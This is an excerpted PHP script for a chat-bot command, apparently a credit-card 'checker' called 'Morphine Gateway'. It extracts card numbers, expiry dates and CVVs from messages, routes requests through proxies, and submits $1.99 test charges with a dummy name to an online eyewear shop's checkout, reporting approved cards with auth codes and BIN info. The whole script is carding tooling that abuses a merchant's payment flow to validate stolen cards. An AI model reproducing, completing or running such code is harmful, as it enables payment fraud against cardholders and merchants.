...
$gateway = "Morphine Gateway";
$check_type = "CCN - Charge";
...
if(strpos($message, "/aw") === 0 || strpos($message, "!aw") === 0 || strpos($message, ".aw") === 0){
  ...
  if (preg_match_all("/(\d{15})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{4})/", $lista, $matches)||preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)){
                ...
                $e = cURL(
                    ...
                    $headers = [
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                        "Referer: https://www.vintageeyewearshowroom.com/checkout/",
                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
                    ],
                    "",
                    "GET",
                ...
                $execute = cURL_ProxyOn(
                    ...
                    "sessionId=$sessionID&amount=1.99&required=&uIDTrans=1&tdsApproved=&tracer=$tracer&completeStatus=0&sid=$sid&currency_code=USD&cbOverride=1&name=dsadas%20asdsada&amountDisplay=USD%20%241.99&ccNumber=$cc&CVV2=&ccType=$ctype&expMonth=$mm&expYear=$yy&action=process&sid=$sid",
                    "POST",
                    1,
                    $cookie
                );
...
Response -» Approved [Auth Code: $appCode]
Type -» $check_type 
Gateway -» $gateway
Time -» <b>$time</b><b>s</b>
------- Bin Info -------</b>
